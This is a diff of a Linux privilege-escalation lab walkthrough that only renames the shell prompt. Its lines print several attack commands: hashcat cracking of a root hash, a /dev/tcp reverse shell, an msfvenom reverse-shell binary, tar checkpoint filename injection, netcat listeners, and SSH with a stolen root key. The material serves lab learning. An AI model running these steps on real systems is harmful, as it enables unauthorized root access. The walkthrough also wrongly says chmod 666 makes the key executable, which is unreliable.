@@ -85,9 +85,9 @@ mysql:!:18133:0:99999:7:::
 ```
 on my kali
 ```console
-kali@kali:~/LinuxPrivEsc$ echo "root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::" > root.txt
-kali@kali:~/LinuxPrivEsc$ hashcat -a 0 -m 1800 -o cracked.txt root.txt /usr/share/wordlists/rockyou.txt --force
-kali@kali:~/LinuxPrivEsc$ cat cracked.txt 
+bibo318@parrot:~/LinuxPrivEsc$ echo "root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::" > root.txt
+bibo318@parrot:~/LinuxPrivEsc$ hashcat -a 0 -m 1800 -o cracked.txt root.txt /usr/share/wordlists/rockyou.txt --force
+bibo318@parrot:~/LinuxPrivEsc$ cat cracked.txt 
 $6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:XXXXXXXXXXX
 ```
 find out what XXXXXXXX is :P. GLHF
@@ -230,7 +230,7 @@ bash -i >& /dev/tcp/<kali ip>/<port> 0>&1
 ```
 gratz we just create backdoor, now run netcat and wait for the connection
 ```console
-kali@kali:~/LinuxPrivEsc$ nc -nvlp 1234
+bibo318@parrot:~/LinuxPrivEsc$ nc -nvlp 1234
 listening on [any] 1234 ...
 connect to [10.8.14.151] from (UNKNOWN) [10.10.236.173] 56477
 bash: no job control in this shell
@@ -266,8 +266,8 @@ tar czf /tmp/backup.tar.gz *
 ```
 Note that the tar command is being run with a wildcard (*) in your home directory. Take a look at the GTFOBins page for [tar](https://gtfobins.github.io/gtfobins/tar/). Note that tar has command line options that let you run other commands as part of a checkpoint feature. Next step is create a reverse shell ELF binary using ```msfvenom```
 ```console
-kali@kali:~/LinuxPrivEsc$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ur ip> LPORT=<ur port> -f elf -o shell.elf # crate reverse shell
-kali@kali:~/LinuxPrivEsc$ python -m SimpleHTTPServer 8000 # create a httpserver
+bibo318@parrot:~/LinuxPrivEsc$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ur ip> LPORT=<ur port> -f elf -o shell.elf # crate reverse shell
+bibo318@parrot:~/LinuxPrivEsc$ python -m SimpleHTTPServer 8000 # create a httpserver
 ```
 now use wget to get the reverse shell ELF binary
 ```console
@@ -290,7 +290,7 @@ user@debian:~$ touch /home/user/--checkpoint-action=exec=shell.elf
 ```
 When the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames. now set up netcat and wait for cron job to execute our reverse shell
 ```console
-kali@kali:~/LinuxPrivEsc$ nc -nvlp 1234
+bibo318@parrot:~/LinuxPrivEsc$ nc -nvlp 1234
 listening on [any] 1234 ...
 connect to [10.8.14.151] from (UNKNOWN) [10.10.236.173] 56585
 ls
@@ -561,9 +561,9 @@ drwxr-xr-x 22 root root 4096 Aug 25  2019 ..
 ```
 As you can see we have a premission to read+write to ```root_key``` let copy the content of the file and to our machine and ssh to the target again using root cerdential. Dont for get to make the copied root_key executable by using ```chmod 666```. now run:
 ```console
-kali@kali:~/LinuxPrivEsc$ ls
+bibo318@parrot:~/LinuxPrivEsc$ ls
 cracked.txt  root_key  root.txt  shell.elf
-kali@kali:~/LinuxPrivEsc$ ssh -i root_key root@<target ip>
+bibo318@parrot:~/LinuxPrivEsc$ ssh -i root_key root@<target ip>
 Last login: Sun Aug 25 XXXXXXXXX from xxxxxxxx
 root@debian:~# 
 ```
